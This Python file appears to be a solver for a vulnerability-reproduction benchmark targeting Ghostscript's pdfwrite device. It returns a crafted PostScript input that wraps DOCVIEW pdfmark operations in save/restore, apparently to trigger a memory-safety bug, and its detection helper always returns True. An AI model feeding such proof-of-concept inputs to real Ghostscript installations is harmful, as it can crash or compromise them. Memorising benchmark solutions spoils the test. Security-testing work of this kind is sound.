import os
import tarfile
from typing import Optional


class Solution:
    def _looks_like_ghostscript_pdfwrite(self, src_path: str) -> bool:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                hits = 0
                for m in tf:
                    if not m.isfile():
                        continue
                    n = m.name.lower()
                    if not (n.endswith((".c", ".h", ".ps", ".cpp"))):
                        continue
                    if any(k in n for k in ("gdevpdf", "pdfwrite", "gdev_pdf", "pdfwr", "pdfmark")):
                        hits += 1
                        if hits >= 2:
                            return True
                    if m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    if b"pdfwrite" in data and (b".pdfmark" in data or b"pdfmark" in data):
                        return True
        except Exception:
            return True
        return True

    def solve(self, src_path: str) -> bytes:
        _ = self._looks_like_ghostscript_pdfwrite(src_path)

        ps = (
            b"%!PS-Adobe-3.0\n"
            b"%%Pages: 1\n"
            b"%%BoundingBox: 0 0 200 200\n"
            b"%%EndComments\n"
            b"systemdict /.pdfmark known { userdict /pdfmark systemdict /.pdfmark get put } if\n"
            b"/s save def\n"
            b"[ /PageMode /UseOutlines /DOCVIEW pdfmark\n"
            b"[ /PageLayout /TwoColumnLeft /DOCVIEW pdfmark\n"
            b"s restore\n"
            b"%%Page: 1 1\n"
            b"newpath 10 10 moveto 190 190 lineto stroke\n"
            b"showpage\n"
            b"quit\n"
            b"%%EOF\n"
        )
        return ps